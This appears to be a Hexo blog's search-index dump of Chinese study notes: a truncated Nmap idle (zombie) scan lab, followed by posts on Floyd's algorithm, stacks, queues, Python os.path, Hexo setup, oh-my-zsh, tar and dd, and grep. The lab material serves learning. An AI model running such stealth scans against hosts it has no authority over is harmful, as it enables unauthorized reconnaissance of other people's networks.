NMAP扫描指定端口判断主机是否是合适的zombie12345678910111213root@kali:~# nmap -p445 192.168.86.132 --script=ipidseq.nseStarting Nmap 7.01 ( https://nmap.org ) at 2016-05-28 05:12 EDTNmap scan report for bogon (192.168.86.132)Host is up (0.00033s latency).PORT STATE SERVICE445/tcp open microsoft-dsMAC Address: 00:0C:29:10:88:B3 (VMware)Host script results:|_ipidseq: Incremental!Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds 可以看到该主机的ipid是递增的哦！僵尸找到了，开始进行扫描。 NMAP 僵尸扫描1234567891011121314151617181920212223242526272829root@kali:~# nmap 192.168.86.130 -sI 192.168.1.132 -Pn -P 0-100Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-28 05:16 EDTIdle scan using zombie 192.168.1.132 (192.168.1.132:80); Class: Incrementalroot@kali:~# nmap 192.168.86.130 -sI 192.168.86.132 -Pn -P 0-100Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-28 05:16 EDTIdle scan using zombie 192.168.86.132 (192.168.86.132:80); Class: IncrementalNmap scan report for bogon (192.168.86.130)Host is up (0.051s latency).Not shown: 977 closed|filtered portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh23/tcp open telnet25/tcp open smtp53/tcp open domain80/tcp open http111/tcp open rpcbind139/tcp open netbios-ssn445/tcp open microsoft-ds512/tcp open exec513/tcp open login514/tcp open shell1099/tcp open rmiregistry1524/tcp open ingreslock2049/tcp open nfs2121/tcp open ccproxy-ftp]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(6)Floyd最短路径算法]]></title>
      <url>%2F2016%2F05%2F27%2F(6)Floyd%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%AE%97%E6%B3%95%2F</url>
      <content type="text"><![CDATA[0x00 前景如何求两点之间最短路径？也许你会想到深度或广度优先搜索。进行n2遍的深度或广度优先搜索，对每两个点都进行一次深度或者广度优先搜索，便可以求得任意两点之间的最短路径。just like this？ 案例分析:如果有n个城市，这些城市间有m条路，彼此交错，彼此相连，而我们想知道A，B两个城市之间的最短路径？ 假设有4个城市，可以使用二维数组来存储彼此之间的信息，如下4*4矩阵所示，2到1的距离为无穷(&amp;)，1到2的距离为2，4到3的距离为12,另外约定一个城市自己到自己的距离是0。 1 2 3 4 1 0 2 6 4 2 &amp; 0 3 &amp; 3 7 &amp; 0 1 4 5 &amp; 12 0 先考虑只经过一个1号点开始中转，然后求两点间的最短距离。那么只需要判断e[i][1]+e[1][j]是否比e[i][j]小就可以了，经过1号点更新后的结果如下: 1 2 3 4 1 0 2 6 4 2 &amp; 0 3 &amp; 3 7 9 0 1 4 5 7 11 0 如此求在只允许经过1和2号的情况下求任意两点间的最短路程，以此类推。其实用一句话概况就是:从i号顶点到j号顶点只经过k号点的最短路径。这是一种动态规划的思想。 核心代码：1234567for(k=0;k&lt;n;k++) for(i=0;i&lt;n;i++) for(j=0;j&lt;n;j++) if(e[i][j]&gt;e[i][k]+e[k][j]) e[i][j]=e[i][k]+e[k][j];``` ### 0x01 代码实现 #include int main(){ int e[10][10],m,n,k,i,j; int max=100000000;//存储一个我们认为是一个正无穷的数 //读入n，m，n表示顶点个数，m表示边的条数 scanf(&quot;%d %d&quot;,&amp;n,&amp;m); //初始化 for(i=1;i&lt;=n;i++) for(j=1;j&lt;=n;j++) if(i==j) e[i][j]=0; else e[i][j]=max; //读入边 int t1,t2,t3; for(i=1;i&lt;=m;i++) { scanf(&quot;%d %d %d&quot;,&amp;t1,&amp;t2,&amp;t3); //表示从顶点t1到顶点t2的距离为t3 e[t1][t2]=t3; } //Floy算法核心代码 for(k=1;k&lt;=n;k++) for(i=1;i&lt;=n;i++) for(j=1;j&lt;=n;j++) if(e[i][j]&gt;e[i][k]+e[k][j]) e[i][j]=e[i][k]+e[k][j]; //输出最后结果 for(i=1;i&lt;=n;i++) { for(j=1;j&lt;=n;j++) { printf(&quot;%10d&quot;,e[i][j]); } printf(&quot;\n&quot;); } return 0; }``` 此系列均来源:http://blog.jobbole.com/100936/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(5)栈]]></title>
      <url>%2F2016%2F05%2F27%2F(5)%E6%A0%88%2F</url>
      <content type="text"><![CDATA[0x00 碎语栈是一种后进先出的数据结构。栈限定只能在一端进行插入和删除操作。 栈的实现很简单，其基本的元素只需要一个一维数组和一个指向栈顶的变量top就够了。通过变量top对栈进行插入和删除操作。 0x01 栈的代码实现一个回文字符串的特征，它必须是中间对称的，比如acca，abcacba是回文字符串，而abcbca不是。 使用栈这一数据结构来判断输入的一串字符是否是回文字符串: 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;#include&lt;string.h&gt;struct stack&#123; //定义一个栈 char data[100]; int top;&#125;;int main()&#123; struct stack s; int i,len,mid,next; char a[100]; s.top=-1;//初始化栈,规定top=-1时栈为空 gets(a);//从屏幕获得字符串 len=strlen(a); mid=len/2-1;//找到字符串的中间位置，-1是为了与gets存储的字符串下标相对应，因为gets是从0开始存储的 for(i=0;i&lt;=mid;i++)&#123; s.top++; s.data[s.top]=a[i]; &#125; //对字符串的长度进行判断 if(len%2==0) next=mid+1;//偶数加1 else next=mid+2;//奇数加2，实际上是跳过了中间那个字符 for(i=next;i&lt;=len-1;i++)&#123;//开始匹配 if(s.data[s.top]!=a[i]) break; s.top--; &#125; if(s.top==-1) printf(&quot;yes&quot;); else printf(&quot;no&quot;); return 0;&#125; 此系列参考均来自:http://blog.jobbole.com/100936/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(4)队列]]></title>
      <url>%2F2016%2F05%2F27%2F(4)%E9%98%9F%E5%88%97%2F</url>
      <content type="text"><![CDATA[0x00 队列初识我们引用两个整型变量head和tail来记录队列，head用来记录队列的队首，tail用来记录队列的队尾的(就是最后一位)下一个位置。 队列是一种特殊的线性结构，它至允许在队列的头部(head)进行删除操作，即出队，而在队列的尾部(tail)进行插入操作，即入队。这是一种“先进先出”的原则(First In First Out)。 简单总结就是: 在队首删除一个数的操作是head++;显然这样浪费了空间，但是却节省了大量时间。 在队尾增加一个数的操作是q[tail];tail++; 队列是今后学习广度优先搜索以及最短路径算法的核心数据结构。 下面将队列的三个基本元素(一个数组，两个变量)封装为一个结构体: 123456struct queue&#123; int data[100];//队列的主体，用来存储内容 int head;//队首 int tail;//队尾&#125; 0x01 队列实现的代码:1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;struct queue&#123; int data[100]; int head; int tail;&#125;;int main()&#123; struct queue q; int i; q.head=0;//初始化队列 q.tail=0; for(i=0;i&lt;9;i++)&#123;//输入9个数 printf(&quot;请输入队列中的第%i个数:\n&quot;,i+1); scanf(&quot;%d&quot;,&amp;q.data[q.tail]); q.tail++; &#125; while(q.head&lt;q.tail)&#123;//当队列不为空时执行循环 printf(&quot;%d&quot;,q.data[q.head]);//打印第一个数 q.head++;//删除第一个数 q.data[q.tail]=q.data[q.head];//将第一个数添加到末尾 q.tail++; q.head++;//再将队首出队 &#125; return 0;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(4)文件与路径]]></title>
      <url>%2F2016%2F05%2F26%2FPython%E6%A0%87%E5%87%86%E5%BA%93(4)-%E6%96%87%E4%BB%B6%E4%B8%8E%E8%B7%AF%E5%BE%84%2F</url>
      <content type="text"><![CDATA[0x00 os.path 包由于不同的操作系统对路径的处理方式不同，所以不同的操作系统会对应不同的os.path包。 os.path处理路径字符串os.path包主要是处理路径字符串，比如提取 “/usr/bin/dev/file.txt” 里的有用信息 12345678910111213141516171819#!/usr/bin/python#-*-coding:utf-8-*-import os.pathpath = &apos;/usr/bin/dev/file.txt&apos;print(os.path.basename(path)) #查找路径中包含的文件名#print(os.path.dirname(path)) #查找路径中包含的目录#info = os.path.split(path) #将路径分割成文件名和目录两个部分，并放在表中#path2 = os.path.join(&apos;/&apos;,&apos;usr&apos;,&apos;dev&apos;,&apos;file2.txt&apos;) #使用目录文件名构成一个路劲字符串#p_list = [path, path2]print(os.path.commonprefix(p_list)) #查询多个路径的相同部分#运行结果:➜ Python ./os_path.py file.txt/usr/bin/dev/usr/ os.path查询文件相关信息os.path也可以查询文件的相关信息(metadata) 1234567891011#!/usr/bin/python#-*-coding:utf-8-*-import os.pathpath = &apos;/usr/bin/zip&apos;print(os.path.exists(path)) #查询文件是否存在print(os.path.getsize(path)) #查询文件的大小print(os.path.getatime(path)) #查询文件最近一次读取时间print(os.path.getmtime(path)) #查询文件最近一次修改时间print(os.path.isfile(path)) #路径是否指向常规文件print(os.path.isdir(path)) #路径是否指向目录文件 0x02 glob包glob最适用的是查询目录下的文件，glob最常用的方法只有一个，glob.glob(),该方法类似与Linux中的ls，它可以接收一个文件名的正则表达式，列出所有符合该表达式的文件。但是需要注意的是此处的文件名正则表达式不同于Python的正则表达式，而是Linux下shell的表达式。 找出 /myblog/hexo 下的所有文件: 12import globprint(glob.glob(&apos;/root/MyBlogs/hexo/*&apos;))]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[hexo建站笔记]]></title>
      <url>%2F2016%2F05%2F26%2FHexo%2F</url>
      <content type="text"><![CDATA[0x00 安装准备 安装Node.js安装Node最好的方式是使用nvm进行安装，首先从git上克隆nvm项目:1root@jack:~# git clone https://github.com/creationix/nvm.git ~/.nvm &amp;&amp; cd ~/.nvm &amp;&amp; git checkout `git describe --abbrev=0 --tags` 克隆完成使用,使用source命令，激活nvm:1root@jack:~# . ~/.nvm/nvm.sh 然后在～/.bashrc添加nvm全局变量:12export NVM_DIR=&quot;$HOME/.nvm&quot;[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; . &quot;$NVM_DIR/nvm.sh&quot; # This loads nvm ok,搞定，开始安装nvm:12root@jack:~# nvm install 5.0Downloading https://nodejs.org/dist/v5.0.0/node-v5.0.0-linux-x64.tar.xz... 启动nvm12root@jack:~# nvm use 5.0Now using node v5.0.0 (npm v3.3.6) uninstal nvm123rm -rf ~/.nvmrm -rf ~/.npmrm -rf ~/.bower 安装Git当然，kali已经默认安装git了。ubuntu安装git:sudo apt-get install git-core 0x01 安装Hexo一切准备就绪，开始安装Hexo吧:12root@jack:~# mkdir MyBlog #新建一个MyBlog目录,作为博客的存放地root@jack:~/MyBlog# npm install -g hexo-cli 等待Hexo安装完毕，然后依次使用以下命令对hexo进行初始配置12root@jack:~/MyBlog# hexo init hexoINFO Start blogging with Hexo! 0x02 建站配置Hexo建站Hexo安装完毕以后依次执行以下命令可以建立Hexo站了1234567891011root@jack:~/MyBlog# hexo init hexo #执行命令时没有“&lt;&gt;”#新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站，&quot;hexo&quot;文件夹即是我们的博客网站。root@jack:~/MyBlog# cd hexo/root@jack:~/MyBlog/hexo# npm install#Hexo随后会自动在目标文件夹建立网站所需要的配置文件root@jack:~/MyBlog/hexo# hexo generate#生成静态文件root@jack:~/MyBlog/hexo# hexo serverINFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.#启动hexo本地服务器访问网址为： http://localhost:4000/ 配置Hexo主题以hexo下的huno主题为例:https://github.com/onejustone/huno 在当前目录中/root/MyBlog/hexo{即已经部署了hexo基本配置文件的文件夹}1root@jack:~/MyBlog/hexo# git clone git://github.com/someus/huno.git themes/huno 然后更改更目录下_config.yml的theme属性为:huno即可更换主题123456root@jack:~/MyBlog/hexo# vim _config.yml # Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: huno 用浏览器打开localhost:4000查看是否成功！ 其它主题:Maupassant一款极简的主题:https://github.com/tufu9441/maupassant-hexo/ 0x03 第一篇文章执行下列命令来创建一篇新文章1$ hexo new [layout] &lt;title&gt; 我们可以在命令中指定文章的布局（layout），默认为 post，可以通过修改 _config.yml 中的 default_layout 参数来指定默认布局。 0x04 部署Hexo配置和使用GithubGit安装完成后注册Github账号:http://www.github.com/github上创建onejustone.git.io仓库以建立个人博客登录后系统，在github首页，点击页面右下角「New Repository」project name:onejustone.github.iodescription:–保持自己的独立思维–要在Pages上建立个人博客，Repository名字是特定的，即是必须是user_name.github.io的形式！点击【Creat Repository】完成创建，之后通过http://onejustone.github.io 去访问我们的博客页面! 通过SSH keys让本地git项目与远程的github建立联系: 首先我们需要检查你电脑上现有的ssh key:12$ cd ~/. ssh 检查本机的ssh密钥# 如果提示：No such file or directory 说明你是第一次使用git。 生成新的SSH Key：1234567891011121314$ ssh-keygen -t rsa -C &quot;邮件地址@youremail.com&quot;Generating public/private rsa key pair.Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):&lt;回车就好&gt;注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」然后系统会要你输入密码：Enter passphrase (empty for no passphrase):&lt;输入加密串&gt;Enter same passphrase again:&lt;再次输入加密串&gt;在回车中会提示你输入一个密码，这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。注意：输入密码的时候没有*字样的，你直接输入就可以了。 最后看到这样的界面，就成功设置ssh key了：123456789101112131415161718192021222324root@jack:~# cd ~/.sshbash: cd: /root/.ssh: 没有那个文件或目录root@jack:~# ssh-keygen -t rsa -C &quot;807527097@qq.com&quot;Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): Created directory &apos;/root/.ssh&apos;.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:4f:1c:9c:fa:91:53:8f:d2:16:9c:2b:6a:76:8a:3c:9b 807527097@qq.comThe key&apos;s randomart image is:+---[RSA 2048]----+| || . o . || + = || o = = || S O = . || = * || + + || ..= o || Eo. |+-----------------+ 配置SSH keys生成SSH keys以后: 将id_rsa.pub里的字符复制下，准备添加到GitHub的SSH keys里。 登陆github系统。点击右上角的 Settings—&gt;SSH keys —&gt; New SSH key 把你本地生成的密钥复制到里面（key文本框中）， 点击 add key 就ok了 测试SSH keys可以输入下面的命令，看看设置是否成功，git@github.com的部分不要修改：1234567$ ssh -T git@github.com如果是下面的反馈：The authenticity of host &apos;github.com (207.97.227.239)&apos; can&apos;t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)?不要紧张，输入yes就好(此处会提示你输入刚才设置的密码)，然后会看到：Hi onejustone! You&apos;ve successfully authenticated, but GitHub does not provide shell access. 设置用户信息现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字必须是你的真名，而不是GitHub的昵称。123$ git config --global user.name &quot;jack&quot;//用户名$ git config --global user.email &quot;onejustone@gmail.com&quot;//写自己的邮箱SSH Key配置成功 ok,本机已成功连接到github。 将Hexo部署到Github部署到github需要安装一个插件1root@jack:~/MyBlog/hexo# npm install hexo-deployer-git --save 然后，进入MyBlog/hexo根目录下对_config.yml文件进行配置:1234567root@jack:~/MyBlog/hexo# vim _config.yml # Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:onejustone/onejustone.github.io.git branch: master 博主这里使用的是SSH Keys如果你用了https Keys的话直接在github里复制https的就行了，总共就两种协议。 然后命令行进入MyBlog/hexo里:123$ hexo clean$ hexo generate$ hexo deploy ok，我们的小窝棚已经基本搭建好了，现在可以访问你的个人github页面查看一把了我的是http://onejustone.github.io 对应的将onejustone改成你自己的github账户名就行了！ 0x05 绑定域名 GitHub Pages的设置:在onejustone.github.io Repository的根目录下面，新建一个名为CNAME的文本文件，里面写入你要绑定的域名，比如www.onejustone.xyz. 阿里万维网下注册域名:http://wanwang.aliyun.com/domain,然后登陆阿里云控制台，找到“云解析”，选择解析设置，点击新手设置，添加gitpages的IP地址: 192.30.252.153 通过浏览器，访问http://www.onejustone.xyz， 就打开了我们建好的博客站点。 为防止hexo部署后，CNAME会被自动删除，需要在source文件夹，创建CNAME(同时favicon.ico、images也可以在source文件下创建). 0x06 关于windows下中文乱码问题在编辑文件的时候将文本的保存格式设置为UTF8格式保存！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(3)排序去重]]></title>
      <url>%2F2016%2F05%2F25%2F(3)%E5%8E%BB%E9%99%A4%E6%8E%92%E5%BA%8F%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0%2F</url>
      <content type="text"><![CDATA[0x00 案例分析输入n个小于1000的数，去掉重复的数，然后按从大到小的顺序输出。当然我们有两种方法可以用:1)先去掉重复的数，然后在进行排序，最后输出。2）先进行排序，然后再输出的时候只显示重复的数中的一个。 方法1我们可以使用桶排序来完成 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int main()&#123; int a[1000],n,t; printf(&quot;请输入排序的数目n\n:&quot;); scanf(&quot;%d&quot;,&amp;n); for(int i=0;i&lt;1000;i++)&#123; a[i]=0; &#125;//对数组进行初始化 for(int i=0;i&lt;n;i++)&#123; printf(&quot;请输入第一数%d:&quot;,i+1); scanf(&quot;%d&quot;,&amp;t); a[t]=1;//对已经出现的数进行标记 &#125; //打印输出 for(int i=0;i&lt;1000;i++)&#123; if(a[i]==1)&#123; printf(&quot;%d\n&quot;,i); &#125; &#125;&#125; ``` 这种方法的时间复杂度就是桶排序的时间复杂度，就是O(N+M)。#### 方法2先排序，再去重。排序可以使用冒泡或者快速排序。 #includeint main(){ int a[100],n,t,i,j; printf(“请输入排序数目\n:”); scanf(“%d”,&amp;n); for(i=0;i&lt;n;i++){ printf(“请输入第%d个数”,i+1); scanf(“%d”,&amp;a[i]); } //开始冒泡排序 for(i=0;i&lt;n-1;i++) for(j=0;j&lt;n-i;j++){ if(a[j]&lt;a[j+1]){ t=a[j]; a[j]=a[j+1]; a[j+1]=t; } } printf(&quot;%d&quot;,a[0]);//输出第一个数 for(i=1;i&lt;n;i++){//从2循环到n if(a[i]!=a[i-1]) { printf(&quot;%d&quot;,a[i]);//如果当前这个数是第一次出现则输出 } } return 0; }``` 这种方式的时间复杂度有两部分组成，一个是冒泡的复杂度O(N^2),一个是输入和输出的时间复杂度(O(N*2)),但是后一个可以忽略不计。 0x01 小结从以上的我们可以知道，桶排序是最快的，它的时间复杂度是O(N+M),但是它的开销也是最大的；冒泡排序的时间复杂度是O(N^2),时间很慢，但是稳定；快速排序是O(NlogN),比较快了，但是它不稳定，最差情况下依然是O(N^2)。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[安装并配置oh-my-zsh]]></title>
      <url>%2F2016%2F05%2F25%2F%E5%AE%89%E8%A3%85%E5%B9%B6%E9%85%8D%E7%BD%AEoh-my-zsh%2F</url>
      <content type="text"><![CDATA[0x00 安装oh-my-zsh手动安装: 1234$: git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh$: cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc$: chsh -s /bin/zsh#变更shell$: 注销账号重新登陆 0x01 配置zsh的配置主要集中在.zhsrc文件里，可以在此处定义自己的环境变量和别名。配置完成以后可以选择自己中意的主题。只需要在.zshrc中配置ZSH_THEME=”agnoster(我的主题)”，系统默认主题为robbyrussell就可以了，相关文件在~/.oh-my-zsh/thems下。 0x02 插件主要介绍auojump这个插件:安装autojump: 1$: git clone git://github.com/joelthelion/autojump.git 解压以后进入目录,执行: 1./install.py 最后添加如下代码到.zshrc: 1$: autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh 安装powerline电力线 安装powerline 1pip install git+git://github.com/Lokaltog/powerline 安装font fontconfig: 12345wget https://github.com/Lokaltog/powerline/raw/develop/font/PowerlineSymbols.otf https://github.com/Lokaltog/powerline/raw/develop/font/10-powerline-symbols.conf$: mv PowerlineSymbols.otf /usr/share/fonts/$: fc-cache -vf$: mv 10-powerline-symbols.conf /etc/fonts/conf.d/ 作用于vim则在.vimrc中添加如下代码: 12345set rtp+=/usr/local/lib/python2.7/dist-packages/powerline/bindings/vim/&quot; Always show statuslineset laststatus=2&quot; Use 256 colours (Use this setting only if your terminal supports 256 colours)set t_Co=256 作用于zsh则在.zshrc中添加如下代码: 123if [[ -r /usr/local/lib/python2.7/dist-packages/powerline/bindings/zsh/powerline.zsh ]]; then source /usr/local/lib/python2.7/dist-packages/powerline/bindings/zsh/powerline.zshfi 作用于tmux则在.tmu.conf中添加: 12source /usr/local/lib/python2.7/dist-packages/powerline/bindings/tmux/powerline.confset-option -g default-terminal &quot;screen-256color&quot; 卸载1pip uninstall powerline]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第九章-文件的压缩与打包]]></title>
      <url>%2F2016%2F05%2F24%2F%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%96%87%E4%BB%B6%E7%9A%84%E5%8E%8B%E7%BC%A9%E4%B8%8E%E6%89%93%E5%8C%85%2F</url>
      <content type="text"><![CDATA[0x00 常见的压缩命令linux中文件扩展名并么有多大的意义，但是为了方便人类的记忆我们还是将几种常用的压缩文件扩展名罗列如下：1234567.zip zip压缩的文件.gz gzip压缩的文件.bz2 bzip2 压缩的文件.tar tar程序打包的文件，并么有压缩过.tar.gz tar程序打包的文件，并且经过gzip压缩过.tar.bz2 tar程序打包的文件，并经过bzip2压缩过.tar.xz tar打包，xz压缩的文件 compress已经被gzip取代，而bzip2的作用则是为了取代gzip的。而不管是gzip还是bgzip2多只能对一个单一的文件进行压缩，而tat则可以将一些文件，或者目录打包到一起，两者结合，天下无双。 gzip，zcat/zmore/zless/zgrepgzip命令没有压缩参数，会默认自动进行压缩。 选项与参数 {Usage $: gzip -[cdtc] filename} -k:保留源文件 -d:解压缩 -c:将压缩资料显示在屏幕上，可结合数据流重定向来处理 v:显示压缩比等信息 1234➜ c_programer gzip -kv queue.c queue.c: 35.6% -- replaced with queue.c.gz➜ c_programer lsqueue.c queue.c.gz bzip2,bzcat/bzmore/bzless/bzgrepbzip2系列是作为gzip系列的升级版的，其使用方法与gzip一样，同样续的xz系列是bzip2的升级版，它是它们彼此之间好像并不兼容。当然每升级一级对应的压缩比例将更好，但是消耗的时间也会更多这里我们以bzip2系列进行记录。 bzip2选项与参数:{ Usage $: bzip2 [-cdkzv] filename } -c:将解压过程产生的数据输出到屏幕上 -d: 解压 -z: 压缩 -k: 保留原始文件 12345678#不加-k参数将不会保留源文件➜ c_programer bzip2 -z hello.c c_programer ls hello.c.bz2 #加入-k参数➜ c_programer bzip2 -kz hello.c ➜ c_programer ls hello.c hello.c.bz2 bzcat{ Usage $: bzcat filename.bz2 } 我们知道cat命令可以读取纯文本文件，而bzcat作为zcat的升级版其作用是读取被压缩过的纯文本文件内容。1234567#使用bzcat查看hell.c.bz2➜ c_programer bzcat hello.c.bz2 #include&lt;stdio.h&gt;int main()&#123; printf(&quot;hello world!&quot;); return 0;&#125; bzgrepbzgrep可以直接从文字压缩文件中查找关键字，而不需要将文件解压再以grep进行筛选。12➜ c_programer bzgrep -n &apos;include&apos; queue.c.bz2 1:#include&lt;stdio.h&gt; xz,xzcat/xzmore/xzless/xzgrep 0x01 打包命令tar 可以将多个目录或文件打包成一个大文件，同时还可以透过 gzip/bzip2 的支持，将该文件同时进行压缩。 选项与参数: 压缩:{ Usage $: tar [-z|-j|-J] [-cv] 要压缩的文件或者目录 -f filename.tar.* } 查询:{ Usage $: tar -[-z|-j|-J] [-tv] -f filename.tar.* } 解压:{ Usage $: tar [-z|-j|-J] [-xv] 要解压到的的包 -f filename.tar.bz2 -C 解压到哪个目录 }其中:-z|-j|-J：表示使用gzip,bzip2,xz技术-c：表示创建打包文件，-v将显示正在处理的文件名称-t：表示打包的文件中包含哪些文件名-x：表示解压缩-p：将保留源文件原本的权限与属性-P：表示保留绝对路径 使用tar将/etc目录打包到/tmp下123$: tar -jcv /etc -f /tmp/etc.tar.bz2 ➜ / ls /tmp etc.tar.bz2 查看etc.tar.bz2里的文件名123➜ / tar -jtvf /tmp/etc.tar.bz2 drwxr-xr-x root/root 0 2016-05-21 01:48 etc/resolvconf/update-libc.d/。。。。。 将etc.tar.bz2解压懂到/tpm/etc下12#使用-C时 要确认要解压到的目录是否存在，否则解压失败➜ /tmp tar -jxv -f etc.tar.bz2 -C /tmp/etc 配合grep命令解压单一文件123➜ /tmp tar -jxv -f etc.tar.bz2 | grep &apos;etc/udev&apos;etc/udev/etc/udev/rules.d/ 打包某目录但是该目录下的某些除外打包整个/tmp并命名为tmp.tar.gz2存放在/tmp同时不要打包bao本身，并且也不要打包/tmp/ect *的所有文件1➜ /tmp tar -jcv /tmp -f /tmp/tmp.tar.gz2 --exclude=tmp.tar.gz2 --exclude=/tmp/etc * 仅仅备份比某个时刻新的文件1234567#找出比/etc/passwd的mtime还要新的文件$: find /etc -newer /etc/passwd#得到/etc/passwd的mtime$: ll /etc/passwd-rw-r--r-- 1 root root 2944 5月 23 20:54 /etc/passwd#打包比5/23还要新的文件$: tar -jcv -f /root/etc.newer.then.passwd.tar.bz2 \\--newer-mtime=&quot;2016/04/22&quot; /etc/* 将数据打包到usb1$: tar -jcv /root/document/ -f /dev/usb1/data.tar.gz 利用管道与数据流比如将待处理的文件一边打包一边解压到目标目录中12➜ /tmp tar -cvf- /etc | tar -xvf-#类似与cp -r /etc /tmp，但是tar也有自己的用途 0x04 其它常见的压缩与备份工具 dddd可以直接读取磁盘，几乎是直接读取磁区的，然后将其整个备份。 选项与参数{ Usage $: dd if=” “ of=” “ bs=” “ count=” “ } if:即input file，可以是装置 of:即output file，可以是装置 bs:划分以block的大小，默认是512bytes count:多少个bs的 将/etc/passwd文件刻录到/tmp/passwd.back中1234➜ /tmp dd if=/etc/passwd of=/tmp/passwd.back记录了5+1 的读入记录了5+1 的写出2944字节(2.9 kB)已复制，0.000241941 秒，12.2 MB/秒 将iso镜像文件刻录到usb中1➜ /tmp dd if=/tmp/kail.iso of=/dev/sda]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十二章 正在表达与文件格式化处理]]></title>
      <url>%2F2016%2F05%2F24%2F%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%8E%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x00 前言正则表示法的字串表示方式依照不同的严谨度而分为基础正则表示法与延伸正则表示法。延伸型正则表示法除了简单的一组字串处理之外，还可以作群组的字串处理，例如进行搜寻 VBird 或 netman 或 lman 的搜寻，注意，是『或(or)』而不是『和(and)』的处理，此时就需要延伸正规表示法！ 正则表达式与通配符是完全不一样的东西，通配符(wildcard)代表的只是bash操作界面的一个功能，但正在表达式是一种字符处理的表示方式，两者要分清！ 此外，使用正则表达式时需要注意当前环境中的语言设置，因为每种语言的编码环境的不同，使用正则表示所得出的结果也会不同的！ 为了避免编码产生的问题，有些特殊字符需要我们了解下： 特殊符号 代表意义 [:alnum:] 代表英文大小写字节及数字，亦即 0-9, A-Z, a-z [:alpha:] 代表任何英文大小写字节，亦即 A-Z, a-z [:upper:] 代表大写字节，亦即 A-Z [:lower:] 代表小写字节，亦即 a-z [:digit:] 代表数字而已，亦即 0-9 0x01 基础正则表达式 既然正规表示法是处理字串的一种表示方式，那么对字节排序有影响的语系数据就会对正规表示法的结果有影响！ 此外，正规表示法也需要支持工具程序来辅助才行！所以，我们这里就先介绍一个最简单的字串撷取功能的工具程序，那就是 grep 罗了! grep的进阶技能选项与参数: { usage $: grep [-A] [-B] [–color=auto] ‘关键字’ filename } -A:后面可加数字，为 after 的意思，除了列出该行外，后续的 n 行也列出来； -B:后面可加数字，为 befer 的意思，除了列出该行外，前面的 n 行也列出来； –color=auto 可将正确的那个撷取数据列出颜色 dmesg列出核心产生的信息，通过grep来获取网卡(eth),并将获得的信息关键字加上颜色，且显示行号 1root@jack:~# dmesg | grep -n &apos;eth&apos;--color=auto 同上，在关键字所在行的前两行和后三行也显示出来12345678910root@jack:~# dmesg | grep -n -A3 -B2 &apos;eth&apos; 544-[ 1.008020] mmc0: SDHCI controller on PCI [0000:02:00.0] using DMA545-[ 1.017700] alg: No test for crc32 (crc32-pclmul)546:[ 1.266674] e1000e 0000:00:19.0 eth0: registered PHC clock547:[ 1.266682] e1000e 0000:00:19.0 eth0: (PCI Express:2.5GT/s:Width x1) 3c:97:0e:80:50:72548:[ 1.266687] e1000e 0000:00:19.0 eth0: Intel(R) PRO/1000 Network Connection549:[ 1.266753] e1000e 0000:00:19.0 eth0: MAC: 10, PHY: 11, PBA No: 1000FF-0FF550-[ 1.266996] ehci-pci 0000:00:1a.0: EHCI Host Controller551-[ 1.267007] ehci-pci 0000:00:1a.0: new USB bus registered, assigned bus number 1552-[ 1.267021] ehci-pci 0000:00:1a.0: debug port 2 在 ~/.bashrc 内加上这行:alias grep=’grep –color=auto’再以source ~/.bashrc来立即生效即可喔！这样每次运行 grep 他都会自动帮你加上颜色显示啦！_ 基础正则表达式练习练习使用到的文本文件如下:123456789101112131415161718192021&quot;Open Source&quot; is a good mechanism to develop programs.apple is my favorite food.Football game is not use feet only.this dress doesn&apos;t fit me.However, this dress is about $ 3183 dollars.^MGNU is free air not free beer.^MHer hair is very beauty.^MI can&apos;t finish the test.^MOh! The soup taste good.^Mmotorcycle is cheap than car.This window is clear.the symbol &apos;*&apos; is represented as start.Oh! My god!The gd software is a library for drafting programs.^MYou are the best is mean you are the no. 1.The world &lt;Happy&gt; is the same with &quot;glad&quot;.I like dog.google is 